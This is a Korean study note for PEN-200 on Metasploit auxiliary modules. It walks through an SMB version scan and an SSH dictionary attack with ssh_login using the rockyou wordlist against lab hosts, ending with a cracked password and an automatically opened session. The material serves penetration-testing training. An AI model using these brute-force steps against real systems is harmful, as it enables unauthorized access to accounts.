# 21.1.2 Auxiliary 모듈

> **Auxiliary Modules** · PEN-200 §21.1.2

auxiliary 모듈은 수백 개이며 프로토콜 열거·포트 스캔·퍼징·스니핑 등을 담당함. 정보 수집은 `gather/`, 서비스 스캔·열거는 `scanner/` 계층에 모여 있음. 전체 목록은 `show auxiliary` 로 볼 수 있으나 너무 길어 실사용은 `search` 로 좁히는 쪽임 — 앱·타입·CVE ID·동작·플랫폼 등으로 필터됨.

*SMB auxiliary 모듈 검색 결과 — 좌측 인덱스로도 모듈을 지정할 수 있음*

활성화는 `use <모듈명>` 또는 검색 결과의 인덱스임. 프롬프트가 활성 모듈 이름으로 바뀌는 것이 활성화 표시임.

```
msf6 > use 56
msf6 auxiliary(scanner/smb/smb_version) >
```

*인덱스 56 으로 smb_version 모듈 활성화*

활성 모듈의 설명·작성자·옵션은 `info` 로, 옵션만 보려면 `show options` 로 확인함. 옵션 표의 `Required` 열이 실행 전에 값이 있어야 하는지를 가름. 대부분 모듈은 일부 옵션을 Metasploit 이 미리 채워 두며, 필수인데 아직 안 채워진 것만 보려면 `show missing` 임.

*smb_version 의 옵션 — RHOSTS 가 필수인데 비어 있음*

```
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202
RHOSTS => 192.168.50.202
```

*`set` 으로 RHOSTS 를 직접 지정*

값 설정은 `set`, 해제는 `unset` 임. **손으로 IP 를 넣는 대신 DB 결과를 그대로 흘려 넣을 수 있음** — `services -p 445 --rhosts` 는 445 가 열린 호스트 전부를 RHOSTS 로 박음. 대상이 많을수록 이쪽이 빠르고 오타도 없음.

```
msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS
Unsetting RHOSTS...
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
Services
========
host            port  proto  name          state  info
----            ----  -----  ----          -----  ----
192.168.50.202  445   tcp    microsoft-ds  open
RHOSTS => 192.168.50.202
```

*DB 에 저장된 스캔 결과로 RHOSTS 자동 설정*

필수 옵션이 다 찼으면 `run` 으로 실행함.

```
msf6 auxiliary(scanner/smb/smb_version) > run
```

*Metasploit 이 식별한 취약점 — SMB Signing 미요구*

두 번째 예시는 SSH 사전 공격임. `search type:auxiliary ssh` 로 찾은 `auxiliary/scanner/ssh/ssh_login` 이 Hydra 를 대신함. 옵션 구성도 Hydra 와 비슷해 단일 `USERNAME`·`PASSWORD` 를 주거나 `USER_FILE`·`PASS_FILE`·`USERPASS_FILE` 로 목록을 주고, `USER_AS_PASS`·`STOP_ON_SUCCESS`·`VERBOSE`·`THREADS` 로 동작을 조절함. 사용자 george 는 이미 확보했다는 전제임.

*인덱스 15 로 활성화한 뒤 옵션 확인 — 프롬프트가 ssh_login 으로 바뀜*

```

PASS_FILE => /usr/share/wordlists/rockyou.txt

msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
```

*사전 공격 성공*

**Hydra 와 갈리는 지점이 여기임** — Metasploit 은 유효한 자격 증명을 출력만 하는 것이 아니라 **세션까지 열어 줌.** 대화형 접근이 자동으로 확보됨.

수집된 자격 증명은 `creds` 로 조회함. 호스트·서비스·자격 증명 종류까지 DB 에 자동 저장됨.

```
msf6 auxiliary(scanner/ssh/ssh_login) > creds
Credentials

JtR Format
----            ------          -------       ------  -------    -----  ------------
----------
192.168.50.201  192.168.50.201  2222/tcp (ssh)  george  chocolate         Password
```
